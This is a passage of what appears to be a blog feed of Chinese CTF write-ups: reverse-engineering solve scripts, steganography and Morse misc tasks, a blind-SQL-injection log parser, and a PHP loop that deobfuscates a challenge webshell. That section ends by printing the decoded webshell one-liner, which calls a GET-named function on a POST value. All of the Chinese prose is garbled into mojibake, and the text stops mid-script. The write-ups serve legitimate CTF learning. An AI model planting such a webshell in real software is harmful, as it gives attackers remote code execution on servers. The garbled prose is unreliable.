zeroä¸ºä¸æ˜¯0çš„æ—¶å€™è·³è½¬ã€‚ä»£è¡¨zf 0æˆ–è€…1 ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯æ— è®ºå¦‚ä½•éƒ½è·³è½¬åˆ° 13B0+1 </code></p><p><img src="/images/xinshengsai/image-20231121101108265.png" alt="image-20231121101108265"></p><p>option-ã€‹general æ˜¾ç¤ºæœºå™¨ç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101137945.png" alt="image-20231121101137945"></p><p><code>13B0+1  ä¹Ÿå°±æ˜¯C7</code></p><p><img src="/images/xinshengsai/image-20231121101226560.png" alt="image-20231121101226560"></p><p>é€‰ä¸­è¿™é‡Œçˆ†çº¢çš„æŒ‰Uï¼Œå¯ä»¥æŠŠ13b1 ç»™æ˜¾ç¤ºå‡ºæ¥ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101356497.png" alt="image-20231121101356497"></p><p>æŒ‰cè®©è¿™æ®µ13b0 è¯†åˆ«æˆä»£ç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101556557.png" alt="image-20231121101556557"></p><p>13b0 æ˜¯ä¸ä¼šè·³åˆ°é‡Œé¢çš„ï¼Œä½†æ˜¯ä¼šé˜»æ‰°æˆ‘ä»¬åç¼–è¯‘ï¼Œè¿™æ ·æŠŠ0xe8æ”¹ä¸º0x90,å°±æ˜¯è®©ä»–å•¥ä¹Ÿä¸å¹²ï¼ŒæŒ‰cé”®nop,ä»€ä¹ˆä¹Ÿä¸åš</p><p><img src="/images/xinshengsai/image-20231121101808634.png" alt="image-20231121101808634"></p><p>ç„¶ååˆ°ç¨‹åºå¼€å¤´çš„åœ°æ–¹ï¼ŒæŒ‰ä¸‹pé”®ï¼Œæ”¹ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æŒ‰f5    æŸ¥çœ‹ä¼ªç </p><p><img src="/images/xinshengsai/image-20231121101959244.png" alt="image-20231121101959244"></p><p><img src="/images/xinshengsai/image-20231121102139568.png" alt="image-20231121102139568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xD0</span>, <span class="number">0xD0</span>, <span class="number">0x85</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xC5</span>, <span class="number">0x8A</span>, <span class="number">0x93</span>, <span class="number">0x89</span>,</span><br><span class="line">       <span class="number">0x92</span>, <span class="number">0x8F</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0x8F</span>, <span class="number">0xC5</span>, <span class="number">0x84</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>,</span><br><span class="line">       <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xD3</span>, <span class="number">0xDE</span>, <span class="number">0x87</span>]</span><br><span class="line">v5 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v5[i] = (~(i ^ <span class="number">25</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v5.index((enc[i])))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag.encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;d780c9b2d2aa9d40010a753bc15770de&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒ<code>https://blog.csdn.net/Sciurdae/article/details/133925259</code></p><p><code>https://www.bilibili.com/video/BV13w411z7aP/?spm_id_from=333.999.0.0&amp;vd_source=0ea9fd49e9cb90fae591c5eb9cb390f4</code></p><h5 id="WEEK2-REVERSE-Cï¼ŸC-ï¼Ÿ"><a href="#WEEK2-REVERSE-Cï¼ŸC-ï¼Ÿ" class="headerlink" title="WEEK2|REVERSE Cï¼ŸC++ï¼Ÿ"></a>WEEK2|REVERSE Cï¼ŸC++ï¼Ÿ</h5><p><img src="/images/xinshengsai/image-20231121160004228.png" alt="image-20231121160004228"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">array1 = [<span class="number">68</span>,<span class="number">75</span>,<span class="number">66</span>,<span class="number">72</span>,<span class="number">99</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">78</span>,<span class="number">83</span>,<span class="number">74</span>,<span class="number">91</span>,<span class="number">86</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">77</span>,<span class="number">85</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">47</span>,<span class="number">92</span>,<span class="number">49</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">91</span>,<span class="number">88</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">51</span>,<span class="number">76</span>,<span class="number">115</span>,-<span class="number">124</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">122</span>,-<span class="number">103</span>]</span><br><span class="line">text2 = <span class="string">&quot;NEWSTAR&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    array1[i] -= i ^ -(<span class="built_in">ord</span>(text2[i]) % <span class="number">4</span>)</span><br><span class="line">    array1[i+<span class="number">7</span>] -= <span class="built_in">ord</span>(text2[i]) % <span class="number">5</span></span><br><span class="line">    array1[i+<span class="number">14</span>] -= <span class="number">2</span>*i</span><br><span class="line">    array1[i+<span class="number">21</span>] -= i^<span class="number">2</span></span><br><span class="line">    array1[i+<span class="number">28</span>] -= <span class="built_in">ord</span>(text2[i]) // <span class="number">5</span> + <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    array1[i] -= i</span><br><span class="line">    array1[i] += <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(array1[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, </span><br><span class="line">0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, </span><br><span class="line">0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, </span><br><span class="line">0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, </span><br><span class="line">0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, </span><br><span class="line">0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, </span><br><span class="line">0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, </span><br><span class="line">0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, </span><br><span class="line">0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, </span><br><span class="line">0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, </span><br><span class="line">0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, </span><br><span class="line">0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, </span><br><span class="line">0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, </span><br><span class="line">0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, </span><br><span class="line">0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, </span><br><span class="line">0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, </span><br><span class="line">0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, </span><br><span class="line">0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, </span><br><span class="line">0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, </span><br><span class="line">0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, </span><br><span class="line">0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, </span><br><span class="line">0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, </span><br><span class="line">0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, </span><br><span class="line">0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, </span><br><span class="line">0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16</span><br></pre></td></tr></table></figure><p>input[i] = Table[(16 * (v3 + v4 % 255) &gt;&gt; 4) + 15) &amp; (v3 + v4 % 255)];</p><h5 id="WEEK2-MISC-æ–°å»ºWordæ–‡æ¡£"><a href="#WEEK2-MISC-æ–°å»ºWordæ–‡æ¡£" class="headerlink" title="WEEK2|MISC æ–°å»ºWordæ–‡æ¡£"></a>WEEK2|MISC æ–°å»ºWordæ–‡æ¡£</h5><p>æ–°ä¸ä½›è®ºç¦…</p><p><code>http://hi.pcmoe.net/buddha.html</code></p><p>æ–°ä½›æ›°ï¼šæ¯˜è«¸éš¸åƒ§é™å½è«¸é™€æ‘©éš¸åƒ§ç¼½è–©é¡˜æ¯˜è€¨å’¤é™€é¡˜ç¾…å’¤å–ƒä¿®é¡˜å®£äº¦å®£å¯‚å»å¯‚é˜¿æ˜¯å½é˜¿å¡å°ŠåŠ«æ¯˜èˆ¬æ¯˜æ‰€èé™æ¯˜å’’å¡å°Šè–©å’’æ¯˜æ‰€è‹¥é™èˆ¬æ–¯æ¯˜åš´æ¯˜åš´æ³¢æ–¯è¿¦æ¯˜è‰²æ¯˜æ³¢åš´æ¯˜å–ƒå¿µè‹¥ä¿®å˜šèˆ¬æ¯˜æˆ‘æ¯˜å¦‚æ¯˜å¦‚å›‘å›‘</p><p><img src="/images/xinshengsai/image-20231123100535460.png" alt="image-20231123100535460"></p><h5 id="WEEK2-MISC-æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"><a href="#WEEK2-MISC-æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢" class="headerlink" title="WEEK2|MISC æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"></a>WEEK2|MISC æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢</h5><p>æ‰“å¼€æ˜¯ä¸€ä¸ªéŸ³é¢‘ï¼Œæ‘©æ–¯ç”µç ï¼Œç›´æ¥ç”¨morse2ascii å³å¯</p><p><code> morse2ascii secret.wav</code></p><p><img src="/images/xinshengsai/image-20231123101018700.png" alt="image-20231123101018700"></p><h5 id="WEEK2-MISC-1-åºç« "><a href="#WEEK2-MISC-1-åºç« " class="headerlink" title="WEEK2|MISC 1-åºç« "></a>WEEK2|MISC 1-åºç« </h5><p>sqlç›²æ³¨ misc è„šæœ¬</p><p>access.log</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\week2\\access.log&quot;</span>,encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f = f.readlines()</span><br><span class="line">lists = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    s = re.findall(<span class="string">&quot;1\)\)=(.*),sl&quot;</span>,i)</span><br><span class="line">    num = re.findall(<span class="string">&quot;0user\),(.*?),1\)&quot;</span>,i)</span><br><span class="line">    <span class="comment"># lists[num[0]] = s[0]</span></span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    lists[<span class="built_in">int</span>(num[<span class="number">0</span>])]= <span class="built_in">str</span>(s[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(lists.values()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(e)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-base"><a href="#WEEK2-MISC-base" class="headerlink" title="WEEK2|MISC base!"></a>WEEK2|MISC base!</h5><p>base64éšå†™ï¼Œç›´æ¥è„šæœ¬è§£å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc.txtä¸ºå¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²æ‰€åœ¨çš„æ–‡ä»¶</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\week2\\base.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pattern2ç”¨äºåŒ¹é…ä¸¤ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment"># pattern2ç”¨äºåŒ¹é…ä¸€ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">pattern2 = <span class="string">r&#x27;(\S)==$&#x27;</span></span><br><span class="line">pattern1 = <span class="string">r&#x27;(\S)=$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–åçš„éšå†™äºŒè¿›åˆ¶å­—ç¬¦åŠ å…¥binstringä¸­</span></span><br><span class="line">binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€è¡Œè¯»å–å¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²ï¼Œé€è¡Œå¤„ç†</span></span><br><span class="line"><span class="keyword">while</span>(base64str):</span><br><span class="line">    <span class="comment"># å…ˆåŒ¹é…ä¸¤ä¸ªç­‰å·çš„æƒ…å†µï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œå†é…ç½®ä¸€ä¸ªç­‰å·çš„æƒ…å†µ</span></span><br><span class="line">    <span class="comment"># å¦‚æœæ— ç­‰å·ï¼Œåˆ™æ²¡æœ‰éšè—ï¼Œæ— éœ€å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="built_in">compile</span>(pattern2).findall(base64str):</span><br><span class="line">        <span class="comment"># msträ¸ºç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦ï¼Œè¯¥å­—ç¬¦ä¸ºéšå†™äºŒè¿›åˆ¶ä¿¡æ¯æ‰€åœ¨çš„å­—ç¬¦</span></span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern2).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># ç¡®è®¤mstrå­—ç¬¦å¯¹åº”çš„base64äºŒè¿›åˆ¶æ•°ï¼Œèµ‹å€¼ç»™mbin</span></span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        <span class="comment"># mbinæ ¼å¼å¦‚0b100ï¼Œmbin[0:2]ä¸º0b</span></span><br><span class="line">        <span class="comment"># mbin[2:].zfill(6)ä¸ºå°†0båé¢çš„äºŒè¿›åˆ¶æ•°å‰é¢è¡¥0ï¼Œä½¿0båé¢çš„é•¿åº¦ä¸º6</span></span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># ä¸¤ä¸ªç­‰å·æƒ…å†µéšå†™äº†4ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å4bit</span></span><br><span class="line">        <span class="comment"># èµ‹å€¼ç»™stegobinï¼Œè¿™å°±æ˜¯éšè—çš„äºŒè¿›åˆ¶ä¿¡æ¯</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">4</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="built_in">compile</span>(pattern1).findall(base64str):</span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern1).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># ä¸€ä¸ªç­‰å·æƒ…å†µéšå†™äº†2ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å2bit</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">2</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stegobinå°†å„è¡Œéšè—çš„äºŒè¿›åˆ¶å­—ç¬¦æ‹¼æ¥åœ¨ä¸€èµ·</span></span><br><span class="line"><span class="comment"># ä»ç¬¬0ä½å¼€å§‹ï¼Œ8bitã€8bitå¤„ç†ï¼Œæ‰€ä»¥rangeçš„æ­¥è¿›ä¸º8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binstring),<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># int(xxx,2)ï¼Œå°†äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸º10è¿›åˆ¶çš„æ•´æ•°ï¼Œå†ç”¨chr()è½¬ä¸ºå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binstring[i:i+<span class="number">8</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</span></span><br><span class="line"><span class="comment">#flag&#123;b4se_1s_4_g0od_c0d3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-WebShellçš„åˆ©ç”¨"><a href="#WEEK2-MISC-WebShellçš„åˆ©ç”¨" class="headerlink" title="WEEK2|MISC WebShellçš„åˆ©ç”¨"></a>WEEK2|MISC WebShellçš„åˆ©ç”¨</h5><p>å®˜æ–¹ç»™çš„pocï¼Œä¹Ÿå¯ä»¥æ‰‹æ’•ï¼Œä¸æ˜¯å¾ˆå¤šå±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;å­—ç¬¦ä¸²&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = preg_replace(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">#error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-Jvav"><a href="#WEEK2-MISC-Jvav" class="headerlink" title="WEEK2|MISC Jvav"></a>WEEK2|MISC Jvav</h5><p>javaç›²æ°´å°</p><p>java8 -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\challenge.png s.png</p><p><img src="/images/xinshengsai/image-20231123162930566.png" alt="image-20231123162930566"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è°‹é›†å›¢ctf</title>
      <link href="/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/"/>
      <url>/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/</url>
      
        <content type="html"><![CDATA[<h5 id="å‹ç¼©åŒ…å¤§å¸ˆ"><a href="#å‹ç¼©åŒ…å¤§å¸ˆ" class="headerlink" title="å‹ç¼©åŒ…å¤§å¸ˆ"></a>å‹ç¼©åŒ…å¤§å¸ˆ</h5><p>å¾ˆç®€å•çš„å‹ç¼©åŒ…å¥—å¨ƒï¼Œå¯†ç æ˜¯å‹ç¼©åŒ…çš„å¯†ç <br>pythonè„šæœ¬whindows,ä½†æ˜¯è§£å‹å¾ˆæ…¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  path=<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span 